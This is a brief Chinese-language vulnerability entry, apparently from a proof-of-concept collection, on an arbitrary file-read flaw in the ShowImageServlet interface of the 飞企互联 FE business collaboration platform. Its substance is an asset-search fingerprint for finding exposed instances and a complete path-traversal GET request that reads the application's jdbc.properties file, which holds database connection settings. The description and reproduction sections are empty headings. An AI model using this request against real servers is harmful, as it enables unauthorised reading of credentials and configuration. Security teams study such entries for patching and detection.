# 飞企互联FE业务协作平台ShowImageServlet接口任意文件读取漏洞

- **系统**：飞企互联FE业务协作平台ShowImageServlet接口　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=625AA3D846D23854252F5319B351BC58`

**请求体 / payload**
```

```

**其他**
- 飞企互联FE业务协作平台ShowImageServlet接口任意文件读取漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台